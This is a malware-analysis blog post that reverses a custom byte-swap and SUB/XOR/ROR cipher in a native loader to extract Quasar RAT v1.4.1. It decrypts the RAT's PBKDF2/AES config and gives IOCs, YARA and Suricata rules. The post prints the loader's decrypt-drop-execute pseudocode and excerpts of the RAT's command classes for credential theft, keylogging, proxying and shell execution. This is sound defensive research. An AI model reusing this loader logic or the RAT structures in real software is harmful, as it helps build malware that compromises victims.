---
title: "Reversing a Custom Cipher to Extract Quasar RAT: From Raw Disassembly to Decrypted C2 Config"
permalink: /blog/quasar-loader-custom-cipher/
date: 2026-04-12 00:00:00 +0000
categories: [malware-reversing, threat-intel]
tags: [quasar-rat, loader, custom-cipher, payload-extraction, aes, pbkdf2, yara, radare2, static-analysis]
image:
  path: /assets/images/social/quasar-loader-2026.jpg
description: "Reverse engineering a custom byte-level cipher from raw x64 disassembly to extract a 3.2MB Quasar RAT payload, then cracking the PBKDF2/AES-256 config to reveal the C2 server. Full Python extraction pipeline included."
---

This is the post I've been waiting to write. Not because the malware is sophisticated (Quasar RAT is well-documented open source), but because the analysis required something I haven't done on this blog before: reversing a completely custom encryption algorithm from raw x64 disassembly, implementing it in Python, and using it to extract a 3.2-megabyte payload that no automated tool could unpack.

The sample sat in my triage queue tagged as "Speakeasy shellcode/crypto signal, high confidence." Speakeasy, Mandiant's emulator, had detected cryptographic operations during emulation but couldn't extract the payload. UnpacMe couldn't unpack it. The automated pipeline flagged it and moved on.

I pulled the binary into radare2, found the decryption function at `0x140001000`, and spent the next hour tracing the algorithm instruction by instruction. What I found was a custom cipher that no standard tool would recognize: a byte-pair swap across 3.3 million iterations followed by a per-byte transformation chain of SUB, SUB, XOR, and ROR operations. Not AES. Not XOR. Not RC4. Something the developer wrote from scratch.

After implementing the cipher in Python and running it against the 3.2MB encrypted `.data` section, an MZ header appeared in the output. Inside was Quasar RAT v1.4.1 with CJK-obfuscated class names and PBKDF2/AES-256-CBC encrypted configuration. One more round of crypto reversal gave me the C2 address: `54[.]172[.]72[.]215:4443` on AWS infrastructure.

This post walks through every step: the disassembly, the cipher reversal, the Python implementation, the Quasar config extraction, and the detection rules. Everything is reproducible with the extraction script in the analysis bundle.

---

## The Loader

| Property | Value |
|---|---|
| **SHA-256** | `58c0f6f8f34d79ea67065761fd2bfc32101c1611cb7d16f5c15f8c19f8572e65` |
| **Size** | 3,368,448 bytes (3.2 MB) |
| **Format** | PE32+ x86-64, native C/C++ (not .NET) |
| **Sections** | 7 (`.text` 52KB, `.data` **3.2MB**, `.fptable`) |
| **`.data` Entropy** | 7.79 (near-maximum, 97% of file) |
| **Code Section** | 52KB, only function is the decryption routine |
| **Imports** | `VirtualProtect`, `GetProcAddress`, `LoadLibraryExW`, `ShellExecuteA` |

The binary is 97% encrypted data. A 52KB native loader wrapping a 3.2MB encrypted blob.

---

## Kill Chain

![Kill chain](/assets/images/posts/quasar_loader/1_killchain.png)
*Native loader sleeps 5s, decrypts 3.2MB blob with custom cipher, drops to `%PUBLIC%\Libraries\win_update_host.exe`, executes via ShellExecuteA. Quasar then decrypts its PBKDF2/AES config and connects to AWS C2.*

---

## Reversing the Custom Cipher

### Finding the Decryption Function

The entry point (`0x1400013E8`) calls the CRT security cookie init, then jumps to `0x140001274` (the CRT main wrapper). From there, the actual main function at `0x140001000` is called with cross-references to the `.data` section.

I found `fcn.140001000` by searching for functions that reference the `.data` section address range (`0x140018000+`):

```
r2 -c 'aaa; axt 0x140018000' sample.exe
```

### The Disassembled Algorithm

At `fcn.140001000`, the first thing the loader does is sleep for 5 seconds (anti-sandbox):

```asm
; Anti-sandbox delay
mov  ecx, 0x1388              ; 5000 milliseconds
call [Sleep]                   ; kernel32!Sleep
```

Then it sets up a pointer to the encrypted buffer at `.data+0xA40` (`0x140018A40`) and enters two loops.

**Loop 1: Byte-pair swap (3.3 million iterations)**

```asm
; Loop at 0x140001040 — swap adjacent byte pairs
.loop_swap:
    mov  edx, r9d               ; edx = index
    lea  eax, [r9 + 1]          ; eax = index + 1
    movzx eax, byte [rax + rdi] ; load blob[index+1]
    movzx r8d, byte [rdx + rdi] ; load blob[index]
    mov  byte [ecx + rdi], r8b  ; blob[index+1] = blob[index]
    mov  byte [rdx + rdi], al   ; blob[index] = blob[index+1]
    add  r9d, 2                 ; index += 2
    cmp  r9d, 0x31D5FF          ; loop while index < 3,266,047
    jb   .loop_swap
```

This swaps every pair of adjacent bytes across the entire 3.3-million-byte buffer.

**Loop 2: Per-byte decryption cipher**

```asm
; Loop at 0x140001070 — custom per-byte cipher
.loop_decrypt:
    mov  edx, r8d               ; edx = counter (byte index)
    lea  eax, [r8 - 0x1B]       ; eax = counter - 27
    movzx ecx, byte [rdx + rdi] ; cl = blob[counter]
    sub  cl, r8b                ; cl -= (counter & 0xFF)
    inc  r8d                    ; counter++
    sub  cl, 0x10               ; cl -= 16
    xor  cl, al                 ; cl ^= ((counter-1) - 27) & 0xFF
    ror  cl, 5                  ; cl = rotate_right(cl, 5)
    mov  byte [rdx + rdi], cl   ; blob[counter] = cl
```

Four operations per byte, in sequence:

![Cipher algorithm](/assets/images/posts/quasar_loader/2_cipher.png)
*SUB counter, SUB 16, XOR (counter-27), rotate right 5 bits. Applied to every byte of the 3.2MB blob.*

### Why Standard Tools Fail

This cipher is not XOR, not RC4, not AES. There is no key in the traditional sense. The "key" is the byte's own position in the buffer (the counter), combined with fixed constants (16 and 27). Every byte uses a different effective key derived from its index. No signature-based decryption tool can recognize this pattern.

The byte-swap step adds another layer. Even if an analyst tries brute-force XOR on the raw blob, the swapped byte order means the first two bytes of the plaintext (`4D 5A` for an MZ header) are at positions 1 and 0 (reversed), not 0 and 1.

### The Python Implementation

```python
def decrypt_loader_payload(pe_data):
    """Decrypt the 3.2MB payload from the loader's .data section."""
    # Encrypted blob at .data + 0xA40, size 0x31D5FF
    blob = bytearray(pe_data[0x17240:0x17240 + 0x31D5FF])

    # Step 1: Byte-pair swap
    for i in range(0, len(blob) - 1, 2):
        blob[i], blob[i+1] = blob[i+1], blob[i]

    # Step 2: Per-byte cipher
    for i in range(len(blob)):
        cl = blob[i]
        cl = (cl - (i & 0xFF)) & 0xFF       # SUB counter
        cl = (cl - 0x10) & 0xFF              # SUB 16
        cl = cl ^ ((i - 0x1B) & 0xFF)        # XOR (counter - 27)
        cl = ((cl >> 5) | (cl << 3)) & 0xFF  # ROR 5
        blob[i] = cl

    return bytes(blob)  # Returns MZ PE (Quasar RAT)
```

The full extraction script (`extract_quasar_payload.py`) is available in the [analysis bundle](https://github.com/taogoldi/analysis_data/tree/main/quasar_loader_apr_2026/scripts).

### Result

```
[+] First 16 bytes (decrypted): 4d5a90000300000004000000ffff0000
[+] PE header confirmed at offset 0x80
[+] FileDescription: Quasar Client
[+] FileVersion: 1.4.1
[+] ProductName: Quasar
```

3,266,047 bytes of encrypted noise became a clean Quasar RAT v1.4.1 PE.

---

## The Full Loader: Drop and Execute

With the cipher reversed, the complete function at `0x140001000` reveals the full kill chain. Here is the annotated IDA pseudocode:

```c
void __fastcall DecryptAndDropQuasar()
{
    // ---- STEP 0: Anti-sandbox delay ----
    Sleep(5000u);                          // 5-second sleep to evade sandbox timeouts

    // ---- STEP 1: Byte-pair swap ----
    // Swap every adjacent pair across the entire 3.2MB encrypted buffer
    for ( i = 0; i < 0x31D5FF; i += 2 )
    {
        tmp = g_EncryptedQuasarPayload[i + 1];
        g_EncryptedQuasarPayload[i + 1] = g_EncryptedQuasarPayload[i];
        g_EncryptedQuasarPayload[i] = tmp;
    }

    // ---- STEP 2: Per-byte decryption cipher ----
    // SUB(counter) -> SUB(0x10) -> XOR(counter - 0x1B) -> ROR(5)
    for ( j = 0; j < 0x31D600; ++j )
    {
        cl  = g_EncryptedQuasarPayload[j];
        cl -= (j & 0xFF);                 // SUB counter
        cl -= 0x10;                        // SUB 16
        cl ^= ((j - 0x1B) & 0xFF);        // XOR (counter - 27)
        cl  = __ROR1__(cl, 5);             // rotate right 5 bits
        g_EncryptedQuasarPayload[j] = cl;
    }

    // ---- STEP 3: Drop decrypted PE to disk ----
    ExpandEnvironmentStringsA(
        "%PUBLIC%\\Libraries\\win_update_host.exe",
        lpDst, 260);                       // Resolve drop path

    hFile = CreateFileA(
        lpDst,
        GENERIC_WRITE,                     // 0x40000000
        0, 0,
        CREATE_ALWAYS,                     // overwrite if exists
        FILE_ATTRIBUTE_NORMAL,             // 0x80
        0);

    WriteFile(
        hFile,
        g_EncryptedQuasarPayload,          // now decrypted
        0x31D600,                          // 3,266,048 bytes
        &bytesWritten, 0);

    CloseHandle(hFile);

    // ---- STEP 4: Execute the dropped payload ----
    ShellExecuteA(0, "open", lpDst, 0, 0, 0);
}
```

### What This Tells Us

The drop path is significant: `%PUBLIC%\Libraries\win_update_host.exe`. The attacker chose this location and filename deliberately:

1. **`%PUBLIC%\Libraries`** is a legitimate Windows folder (`C:\Users\Public\Libraries`) that is writable without elevation. Unlike `%TEMP%`, it is not commonly monitored by endpoint agents as a staging directory.

2. **`win_update_host.exe`** masquerades as a Windows Update component. Legitimate Windows Update binaries include `wuauclt.exe`, `WaaSMedicAgent.exe`, and `UsoClient.exe`. A filename containing "win_update" blends into the noise on a process list, especially in environments where defenders scan for known-bad names rather than known-good ones.

3. **`ShellExecuteA("open")`** launches the payload through the Windows Shell rather than calling `CreateProcessA` directly. This introduces an extra layer of indirection: the Shell resolves the executable, checks file associations, and then spawns the process. Some behavior-based detectors hook `CreateProcessA/W` but not `ShellExecuteA`, making this a simple evasion technique.

4. **`FILE_ATTRIBUTE_NORMAL` (0x80)** is used instead of `FILE_ATTRIBUTE_HIDDEN`. The operator chose visibility over stealth at the file level, relying on the masquerade filename rather than hidden attributes to avoid detection.

5. **`CREATE_ALWAYS`** overwrites any existing file at the drop path. If a previous infection attempt left a partial or corrupted file, this ensures a clean drop every time.

The complete chain is: **Sleep (5s) -> Swap -> SUB/XOR/ROR Decrypt -> Drop to `%PUBLIC%\Libraries\` -> ShellExecuteA**. From first instruction to payload execution, the loader does exactly one thing and does it without any error handling, without anti-analysis tricks beyond the initial sleep, and without persistence. Persistence is the payload's job (Quasar installs itself to `%AppData%\SubDir\Client.exe` with a registry run key).

![Full decompiled function](/assets/images/posts/quasar_loader/7_full_decompiled.png)
*IDA decompiled view of `DecryptAndDropQuasar` at 0x140001000: Sleep, byte-swap, per-byte cipher, drop to `%PUBLIC%\Libraries\`, execute via ShellExecuteA.*

---

## The Extracted Payload: Quasar RAT v1.4.1

| Property | Value |
|---|---|
| **SHA-256** | `6bb333f45cbb5db45f63379e81b737956804cdde4b436e81612da722d7c9a725` |
| **Size** | 3,266,047 bytes |
| **Format** | PE32 .NET (x86) |
| **Version** | 1.4.1 (from PE version info) |
| **Author** | MaxXor (original Quasar developer) |
| **Obfuscation** | CJK Unicode class/method name obfuscation |
| **Decompiled Files** | 2,304 C# source files |

[Quasar RAT](https://malpedia.caad.fkie.fraunhofer.de/details/win.quasar_rat) is an open-source RAT first released in 2015. It has been used by threat actors ranging from script kiddies to nation-state groups including [APT10, APT33, and Patchwork](https://hunt.io/malware-families/quasar). Version 1.4.1 is the latest stable release.

### CJK Name Obfuscation

Every class and method in this build has been renamed to CJK Unicode strings. A method that handles registry operations becomes `깛跗茧똦_E87B婕轸傁醺碮䙌ᖂ麳ᛅ_F711띆㠲椄_F6CD㯠`. The AES-256 encryption class becomes `_29DB_283E瘐뚶잴㒂_F11Dﭪر婁_EBA3_FFFD_F8C5괦_2EC5ኰ〱胂ꅝ핶`. This makes static analysis tedious but does not break decompilation. ILSpy and DNSpy resolve every method body and cross-reference cleanly despite the garbled names.

The obfuscation tool did not touch string literals, namespace names, or ProtoBuf attributes. Every command name, error message, and configuration string is in plaintext, which is what makes the capabilities analysis below possible.

### Capabilities

Decompilation produced 2,304 C# source files across 71 message types in `Quasar.Common.Messages`. Every command is a ProtoBuf-serialized message class. This build includes the full Quasar v1.4.1 feature set.

**Client Identification (Host Fingerprinting)**

The first message sent after connection. The RAT fingerprints the victim machine and sends 12 fields to the C2, including the encryption key used for further communication:

```csharp
// Quasar.Common.Messages/ClientIdentification.cs
// First message to C2 -- host fingerprint + session key
[ProtoContract]
internal class ClientIdentification : IMessage
{
    [ProtoMember(1)]
    public string Version { get; set; }        // "1.4.1"

    [ProtoMember(2)]
    public string OperatingSystem { get; set; } // OS version string

    [ProtoMember(3)]
    public string AccountType { get; set; }     // Admin or User

    [ProtoMember(4)]
    public string Country { get; set; }         // GeoIP country

    [ProtoMember(5)]
    public string CountryCode { get; set; }     // Two-letter country code

    [ProtoMember(6)]
    public int ImageIndex { get; set; }         // Country flag icon index

    [ProtoMember(7)]
    public string Id { get; set; }              // Unique hardware ID

    [ProtoMember(8)]
    public string Username { get; set; }        // Current username

    [ProtoMember(9)]
    public string PcName { get; set; }          // Computer name

    [ProtoMember(10)]
    public string Tag { get; set; }             // Campaign/group tag

    [ProtoMember(11)]
    public string EncryptionKey { get; set; }   // Session encryption key

    [ProtoMember(12)]
    public byte[] Signature { get; set; }       // RSA signature for key verification
}
```

The `Signature` field is notable: the RAT uses RSA to verify the encryption key's authenticity, confirming the C2 is the expected server and not a sinkhole.

**Remote Desktop and Input Control**

The operator captures the victim's screen with configurable JPEG quality and multi-monitor support. Mouse and keyboard injection provide full interactive control:

```csharp
// Quasar.Common.Messages/GetDesktop.cs
// Remote desktop capture request
[ProtoContract]
internal class GetDesktop : IMessage
{
    [ProtoMember(1)]
    public bool CreateNew { get; set; }     // Force new capture vs cached frame

    [ProtoMember(2)]
    public int Quality { get; set; }        // JPEG compression (1-100)

    [ProtoMember(3)]
    public int DisplayIndex { get; set; }   // Which monitor to capture
}

// Quasar.Common.Messages/DoMouseEvent.cs
// Remote mouse control -- movement, clicks, scrolling
[ProtoContract]
internal class DoMouseEvent : IMessage
{
    [ProtoMember(1)]
    public MouseAction Action { get; set; }  // LeftDown, LeftUp, RightClick, ScrollDown, etc.

    [ProtoMember(2)]
    public bool IsMouseDown { get; set; }    // Button held state

    [ProtoMember(3)]
    public int X { get; set; }              // Cursor X coordinate

    [ProtoMember(4)]
    public int Y { get; set; }              // Cursor Y coordinate

    [ProtoMember(5)]
    public int MonitorIndex { get; set; }   // Target display
}
```

**File Exfiltration (Chunked Transfer)**

File theft uses a streaming protocol to handle large files without exhausting memory. The operator requests a file, and the RAT streams it back in chunks:

```csharp
// Quasar.Common.Messages/FileTransferChunk.cs
// Chunked file exfiltration -- streams large files to C2
[ProtoContract]
internal class FileTransferChunk : IMessage
{
    [ProtoMember(1)]
    public int Id { get; set; }             // Transfer session ID

    [ProtoMember(2)]
    public string FilePath { get; set; }    // Source path on victim

    [ProtoMember(3)]
    public long FileSize { get; set; }      // Total file size

    [ProtoMember(4)]
    public /*CJK-obfuscated*/ object Chunk { get; set; }  // Binary chunk data
}
```

The `Chunk` field type is CJK-obfuscated but resolves to a byte array wrapper. The protocol also includes `FileTransferRequest` (initiate), `FileTransferComplete` (finalize), and `FileTransferCancel` (abort) messages.

**Reverse Proxy (Network Pivoting)**

A SOCKS-style reverse proxy lets the operator tunnel arbitrary TCP connections through the victim, pivoting deeper into the network:

```csharp
// Quasar.Common.Messages.ReverseProxy/ReverseProxyConnect.cs
// SOCKS-style tunnel -- operator connects THROUGH the victim
[ProtoContract]
internal class ReverseProxyConnect : IMessage
{
    [ProtoMember(1)]
    public int ConnectionId { get; set; }   // Tunnel session ID

    [ProtoMember(2)]
    public string Target { get; set; }      // Destination host (internal network)

    [ProtoMember(3)]
    public int Port { get; set; }           // Destination port
}
```

The operator sends a `Target` and `Port` (e.g., `192.168.1.50:3389` for an internal RDP server), and the RAT opens the connection on their behalf. `ReverseProxyData` streams traffic bidirectionally. This is how Quasar operators move laterally after the initial foothold.

**Shell Command Execution**

Remote command execution through `cmd.exe`. Simple but effective:

```csharp
// Quasar.Common.Messages/DoShellExecute.cs
// Execute arbitrary commands via cmd.exe
[ProtoContract]
internal class DoShellExecute : IMessage
{
    [ProtoMember(1)]
    public string Command { get; set; }     // Shell command to execute
}
```

**Keylogging, Credential Theft, Registry**

Keystrokes are captured through `Gma.System.MouseKeyHook`, a .NET library that wraps `SetWindowsHookEx` with `WH_KEYBOARD_LL`. Logs are stored locally under `%AppData%` in the `Quasar Client Startup` directory and exfiltrated via `GetKeyloggerLogsDirectory`.

The `GetPasswords` message triggers browser credential extraction from the `Quasar.Client.Recovery.Browsers` module, targeting Chromium (Login Data SQLite) and Firefox (logins.json) credential stores.

Registry manipulation provides full CRUD through seven message types: `DoCreateRegistryKey`, `DoDeleteRegistryKey`, `DoRenameRegistryKey`, `DoCreateRegistryValue`, `DoChangeRegistryValue`, `DoDeleteRegistryValue`, `DoRenameRegistryValue`.

**Persistence and Client Control**

Startup items are managed via `DoStartupItemAdd` / `DoStartupItemRemove` targeting `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`. The registry value name is the GUID from the config (`9c9b9b52-cc5e-4e34-98f9-d6c777b3f4c9`), pointing to `%AppData%\SubDir\Client.exe`.

Administrative commands include `DoClientUninstall` (self-destruct with file deletion), `DoAskElevate` (UAC prompt), `DoShutdownAction` (shutdown/reboot), `DoVisitWebsite` (open URL in browser), and `DoShowMessageBox` (display message to victim).

### Dual Cryptographic Stacks

This build uses two completely different encryption implementations. A decryption tool that cracks one will not automatically break the other.

**1. Config encryption -- AES-256-CBC + HMAC-SHA256 (native .NET)**

The custom `Aes256` class (CJK-obfuscated in the binary) uses PBKDF2 with 50,000 iterations and a hardcoded 32-byte salt. It derives a 32-byte AES key and a 64-byte HMAC key. The wire format is `[HMAC-SHA256 (32 bytes)][IV (16 bytes)][AES-CBC ciphertext]`:

```csharp
// Aes256 class (deobfuscated) -- config encryption
// PBKDF2 key derivation with custom salt
public Aes256(string masterKey)
{
    // 32-byte hardcoded salt -- unique to this Quasar build
    byte[] salt = new byte[] {
        191, 235, 30, 86, 251, 205, 151, 59, 178, 25,
        2, 36, 48, 165, 120, 67, 0, 61, 86, 68,
        210, 30, 98, 185, 212, 241, 128, 231, 230, 195,
        57, 65
    };

    using var kdf = new Rfc2898DeriveBytes(masterKey, salt, 50000);
    aesKey  = kdf.GetBytes(32);   // AES-256 key
    hmacKey = kdf.GetBytes(64);   // HMAC-SHA256 key
}

// Decrypt: verify HMAC first (encrypt-then-MAC), then AES-CBC
public byte[] Decrypt(byte[] input)
{
    using var ms = new MemoryStream(input);
    using var aes = new AesCryptoServiceProvider();
    aes.KeySize = 256;
    aes.BlockSize = 128;
    aes.Mode = CipherMode.CBC;
    aes.Padding = PaddingMode.PKCS7;
    aes.Key = aesKey;

    // Read and verify HMAC-SHA256 over [IV + ciphertext]
    using (var hmac = new HMACSHA256(hmacKey))
    {
        byte[] computedMac = hmac.ComputeHash(ms.ToArray(), 32,
                                               ms.ToArray().Length - 32);
        byte[] storedMac = new byte[32];
        ms.Read(storedMac, 0, 32);
        if (!ConstantTimeEquals(computedMac, storedMac))
            throw new CryptographicException("Invalid MAC.");
    }

    // Read IV, then decrypt
    byte[] iv = new byte[16];
    ms.Read(iv, 0, 16);
    aes.IV = iv;
    using var cs = new CryptoStream(ms, aes.CreateDecryptor(),
                                     CryptoStreamMode.Read);
    // ... read decrypted plaintext from stream
}
```

**2. C2 traffic encryption -- BouncyCastle Rijndael + ISO10126d2**

A separate `Security` class handles runtime C2 traffic using BouncyCastle (not .NET's built-in crypto). The padding scheme is ISO10126d2, which uses random bytes for padding instead of the predictable PKCS7 pattern. The key derivation uses PBKDF2 with SHA-512 and only 2,048 iterations (weaker than the config's 50,000):

```csharp
// crypto/Security.cs -- BouncyCastle wrapper for C2 traffic
// Rijndael-CBC with ISO10126d2 padding (randomized, non-standard)
internal class Security
{
    // PBKDF2-SHA512 with only 2048 iterations (weaker than config crypto)
    public static string ComputeHash(string text, string salt)
    {
        var digest = new Sha512Digest();
        var gen = new Pkcs5S2ParametersGenerator(digest);
        gen.Init(Encoding.UTF8.GetBytes(text), Base64.Decode(salt), 2048);
        return Base64.ToBase64String(
            ((KeyParameter)gen.GenerateDerivedParameters(
                digest.GetDigestSize() * 8)).GetKey());
    }

    public static string Decrypt(string cipherText, string key, string iv)
    {
        byte[] result = CreateCipher(false, key, iv)
            .DoFinal(Base64.Decode(cipherText));
        return Encoding.UTF8.GetString(result, 0, result.Length);
    }

    // Rijndael (AES) in CBC mode with ISO10126d2 random padding
    private static IBufferedCipher CreateCipher(
        bool isEncryption, string key, string iv)
    {
        var cipher = new PaddedBufferedBlockCipher(
            new CbcBlockCipher(new RijndaelEngine()),
            new ISO10126d2Padding());           // Random padding bytes

        var keyParam = new KeyParameter(Base64.Decode(key));
        ICipherParameters cipherParams = (iv != null && iv.Length >= 1)
            ? new ParametersWithIV(keyParam, Base64.Decode(iv))
            : keyParam;

        cipher.Init(isEncryption, cipherParams);
        return cipher;
    }
}
```

### Command Protocol

All 71 message types use ProtoBuf serialization. The `MessageHandler.Process()` method implements a processor chain pattern where incoming messages are dispatched to every registered handler:

```csharp
// Quasar.Common.Messages/MessageHandler.cs
// Command dispatch -- observer pattern with thread-safe registration
internal static class MessageHandler
{
    private static readonly List<IMessageProcessor> Processors = new();
    private static readonly object SyncLock = new();

    public static void Process(/*CJK-obfuscated*/ object sender, IMessage msg)
    {
        IEnumerable<IMessageProcessor> matches;
        lock (SyncLock)
        {
            // Each processor declares which messages it handles
            matches = Processors
                .Where(x => x.CanExecute(msg) && x.CanExecuteFrom(sender))
                .ToList();
        }
        foreach (var proc in matches)
        {
            proc.Execute(sender, msg);  // Dispatch to handler
        }
    }
}
```

Adding a new command requires only a new `IMessage` class and a matching `IMessageProcessor`. This is why Quasar has been forked so many times (Pulsar, AsyncRAT variants, etc.) -- the architecture makes extension trivial.

![Quasar RAT capabilities](/assets/images/posts/quasar_loader/3_quasar_capabilities.png)
*All 71 ProtoBuf command types organized by function: surveillance, collection, execution, persistence, and lateral movement.*

---

## Cracking the Quasar Config

The Quasar config uses the same encryption pattern as Pulsar RAT (they share a codebase origin): **PBKDF2 key derivation with AES-256-CBC encryption and HMAC-SHA256 authentication**.

The encryption key sits in plaintext in the Settings class:
```
45567C0614C4584B61EF8AB3B378784EFE4A57F8
```

The PBKDF2 uses a **custom 32-byte salt** (not the DcRAT salt, not the standard Quasar salt):

```python
SALT = bytes([191, 235, 30, 86, 251, 205, 151, 59, 178, 25,
              2, 36, 48, 165, 120, 67, 0, 61, 86, 68,
              210, 30, 98, 185, 212, 241, 128, 231, 230, 195,
              57, 65])
```

With 50,000 PBKDF2 iterations and HMAC-SHA1 as the PRF, the derived AES key decrypts every config field:

### Decrypted Configuration

| Field | Value |
|---|---|
| **C2 Host:Port** | `54[.]172[.]72[.]215:4443` |
| **Version** | `1.4.1` |
| **Mutex** | `Office04` |
| **Install SubDir** | `SubDir` |
| **Install FileName** | `Client.exe` |
| **Startup Key** | `9c9b9b52-cc5e-4e34-98f9-d6c777b3f4c9` |
| **Log Directory** | `Quasar Client Startup` |
| **Server Signature** | `Logs` |
| **Encryption Key** | `45567C0614C4584B61EF8AB3B378784EFE4A57F8` |

The C2 at `54[.]172[.]72[.]215` is an AWS EC2 instance. Port 4443 is commonly used by Quasar operators as a non-standard HTTPS port.

---

## IOC Appendix

### Network Indicators

| Type | Value | Context |
|---|---|---|
| IP | `54[.]172[.]72[.]215` | C2 server (AWS EC2) |
| Port | `4443/tcp` | C2 port |

### Host Indicators

| Type | Value | Context |
|---|---|---|
| Drop Path | `%PUBLIC%\Libraries\win_update_host.exe` | Loader drops decrypted Quasar here |
| Masquerade | `win_update_host.exe` | Mimics Windows Update component |
| Mutex | `Office04` | Quasar instance lock |
| File | `%AppData%\SubDir\Client.exe` | Quasar persistence install path |
| Registry | Startup key `9c9b9b52-...` | Quasar persistence |
| Encryption Key | `45567C0614C4584B61EF8AB3B378784EFE4A57F8` | Config decryption |

### File Hashes

| Artifact | SHA-256 |
|---|---|
| Loader (outer) | `58c0f6f8f34d79ea67065761fd2bfc32101c1611cb7d16f5c15f8c19f8572e65` |
| Quasar RAT (extracted) | `6bb333f45cbb5db45f63379e81b737956804cdde4b436e81612da722d7c9a725` |

### MITRE ATT&CK Mapping

| ID | Technique | Evidence |
|---|---|---|
| **Loader** | | |
| T1140 | Deobfuscate/Decode Files | Custom byte cipher (swap + SUB + XOR + ROR) |
| T1027 | Obfuscated Files | 3.2MB encrypted .data section, CJK class names |
| T1497.003 | Time Based Evasion | Sleep(5000) anti-sandbox delay |
| T1106 | Native API | VirtualProtect, GetProcAddress, LoadLibraryExW |
| T1036.005 | Match Legitimate Name | `win_update_host.exe` mimics Windows Update |
| T1074.001 | Local Data Staging | Drop to `%PUBLIC%\Libraries\` (writable, low-visibility) |
| **Quasar RAT** | | |
| T1056.001 | Keylogging | `Gma.System.MouseKeyHook` with `SetWindowsHookEx` |
| T1113 | Screen Capture | `GetDesktop` remote desktop with quality control |
| T1555 | Credentials from Password Stores | Browser credential extraction (Chrome, Firefox, Edge) |
| T1547.001 | Registry Run Keys | `HKCU\...\Run` with GUID startup key |
| T1573 | Encrypted Channel | Dual crypto: AES-256-CBC config + BouncyCastle C2 traffic |
| T1090 | Proxy | SOCKS-style reverse proxy (`ReverseProxyConnect`) |
| T1012 | Query Registry | Full registry CRUD (create/delete/rename keys and values) |
| T1082 | System Information Discovery | `GetSystemInfo` host reconnaissance |
| T1059.003 | Windows Command Shell | `DoShellExecute` command execution |

---

## Detection

### YARA Rules

Three rules. Full file: [`rats/quasar/quasar_loader.yar`](https://github.com/taogoldi/YARA/blob/main/rats/quasar/quasar_loader.yar)

```text
import "pe"

rule QuasarRAT_CustomLoader_ByteCipher {
    meta:
        description = "Detects the custom x64 loader using byte-swap + SUB + XOR + ROR cipher"
        author = "Tao Goldi"
        version = 1
        family = "Quasar Loader"
    strings:
        $sleep = { B9 88 13 00 00 }           // mov ecx, 0x1388 (Sleep 5000ms)
        $loop = { 81 F9 FF D5 31 00 }         // cmp r9d, 0x31D5FF (blob size)
        $sub10 = { 80 E9 10 }                 // sub cl, 0x10
        $ror5 = { C0 C9 05 }                  // ror cl, 5
        $fptable = ".fptable" ascii
    condition:
        uint16(0) == 0x5A4D and filesize > 2MB and
        ($loop and $ror5 and $sub10)
}

rule QuasarRAT_v141_Payload {
    meta:
        description = "Detects Quasar RAT v1.4.1 with CJK obfuscation"
        author = "Tao Goldi"
        version = 1
        family = "Quasar RAT"
    strings:
        $q1 = "Quasar Client" ascii wide
        $q2 = "Quasar.Common.Messages" ascii wide
        $q3 = "MaxXor" ascii wide
        $salt = { BF EB 1E 56 FB CD 97 3B }  // PBKDF2 salt first 8 bytes
    condition:
        uint16(0) == 0x5A4D and
        pe.imports("mscoree.dll") and
        (2 of ($q*) or ($salt and 1 of ($q*)))
}

rule QuasarRAT_Config_54_172 {
    meta:
        description = "Detects this Quasar build with C2 at 54.172.72.215"
        author = "Tao Goldi"
        version = 1
        family = "Quasar RAT"
    strings:
        $key = "45567C0614C4584B61EF8AB3B378784EFE4A57F8" ascii wide
        $mutex = "Office04" ascii wide
        $quasar = "Quasar" ascii wide
    condition:
        uint16(0) == 0x5A4D and ($key and ($quasar or $mutex))
}
```

### Suricata

```
alert tcp $HOME_NET any -> $EXTERNAL_NET 4443 (
    msg:"MALWARE Quasar RAT C2 beacon (TLS on port 4443)";
    flow:established,to_server;
    content:"|16 03|"; depth:2;
    detection_filter:type count, track by_src, count 3, seconds 300;
    sid:2026047; rev:1;
)
```

---

## Code Weaknesses

Despite the custom cipher, this loader has several operational weaknesses that defenders can exploit:

1. **Hardcoded Sleep Duration**: The 5-second `Sleep(5000)` is a fixed value compiled into the binary. Any sandbox that sets its analysis timer above 10 seconds will catch the post-sleep behavior. Modern sandboxes (ANY.RUN, Joe Sandbox, CAPE) all default to 60+ second runs. This anti-sandbox technique was effective circa 2018 but is trivially bypassed today.

2. **Predictable Drop Path**: The drop location `%PUBLIC%\Libraries\win_update_host.exe` is static across all runs. A single file creation rule for this exact path provides 100% detection for this loader variant. The path is not randomized, not derived from the hostname, and not obfuscated in the binary.

3. **No Error Handling**: The loader has zero error checking. If `CreateFileA` fails (write-protected, path not found, AV file lock), it proceeds to `WriteFile` with an invalid handle, silently fails, then calls `ShellExecuteA` on a nonexistent file. There is no retry logic, no fallback path, and no cleanup. A security product that locks `%PUBLIC%\Libraries\` effectively kills this loader.

4. **Cipher is Position-Dependent, Not Key-Dependent**: The cipher uses the byte's index as the only variable. There is no external key, no random seed, no per-sample variation. Every copy of this loader uses the exact same cipher with the exact same constants (0x10, 0x1B, ROR 5). One YARA rule (`sub cl, 0x10` + `ror cl, 5` + loop bound) matches every loader in this family.

5. **No Integrity Verification**: After decryption, the loader writes the blob to disk without checking the MZ header, PE checksum, or any hash. If the encrypted buffer is corrupted (partial download, disk error, analyst patching), the loader drops and executes a garbage file. A more disciplined loader would validate the payload before execution.

6. **ShellExecuteA Leaves Artifacts**: Using `ShellExecuteA("open")` rather than `CreateProcessA` means the execution goes through the Windows Shell. This generates additional telemetry in Prefetch, ShimCache, and Amcache that `CreateProcessA` alone would not produce. It also means the parent process in the process tree is `explorer.exe` (via the Shell), which is an anomalous parent for a binary launched from `%PUBLIC%\Libraries`.

### Quasar RAT (.NET Payload) Weaknesses

The extracted .NET RAT has its own set of weaknesses independent of the loader:

7. **Plaintext Encryption Key in Settings Class**: The master encryption key (`45567C0614C4584B61EF8AB3B378784EFE4A57F8`) is stored as a plaintext static string in the Settings class. Any analyst who decompiles the binary can read this key, derive the AES key via PBKDF2, and decrypt the entire configuration in seconds. There is no obfuscation on this string, no runtime derivation from hardware IDs, and no anti-tampering on the Settings class itself.

8. **Hardcoded PBKDF2 Salt Across the Builder**: The 32-byte salt (`BF EB 1E 56 FB CD 97 3B ...`) is compiled into the Aes256 class. Every payload built with this Quasar builder shares the same salt. This means the first 8 bytes of the salt serve as a reliable YARA fingerprint for the entire builder family, not just this single sample.

